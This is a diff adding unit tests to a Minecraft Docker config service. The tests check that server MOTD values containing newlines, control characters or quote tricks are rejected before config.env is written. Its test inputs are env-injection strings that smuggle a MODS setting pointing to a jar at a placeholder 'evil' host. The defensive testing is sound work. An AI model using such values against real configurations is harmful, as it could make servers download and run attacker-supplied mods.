@@ -1,4 +1,5 @@
 import { describe, it, expect, beforeEach, vi } from 'vitest';
+import { EnvValueError } from '@minecraft-docker/shared/utils';
 import { ConfigService } from '../src/services/ConfigService.js';
 
 // Mock fs module
@@ -402,6 +403,37 @@ MAX_PLAYERS=20
       expect(result.changedFields).toContain('memory');
       expect(result.changedFields).toContain('useAikarFlags');
       expect(result.changedFields).toContain('motd');
+    });
+
+    // config.env is the container's env_file: a line break would add a
+    // setting such as MODS=<url> (#726)
+    it.each([
+      'x\nMODS=http://evil/x.jar',
+      'x\rMODS=http://evil/x.jar',
+      'x\u0000y',
+      'x\u001by',
+      'x\u2028MODS=x',
+      'x\u0085MODS=x',
+      // Compose closes the quote and reads MODS as another setting
+      '"" MODS=http://evil/x.jar',
+      " '' MODS=http://evil/x.jar",
+    ])(
+      'rejects %j without writing config.env',
+      (motd) => {
+        setupUpdateTest({ motd });
+
+        expect(() => configService.updateConfig('testserver', { motd })).toThrow(EnvValueError);
+        expect(mockedWriteFileSync).not.toHaveBeenCalled();
+      }
+    );
+
+    it('writes a multi-word value with § color codes as one line', () => {
+      setupUpdateTest({});
+
+      configService.updateConfig('testserver', { motd: '§6Welcome §lto my server§r - have fun!' });
+
+      const written = String(mockedWriteFileSync.mock.calls[0]![1]);
+      expect(written).toContain('\nMOTD=§6Welcome §lto my server§r - have fun!\n');
     });
   });
 
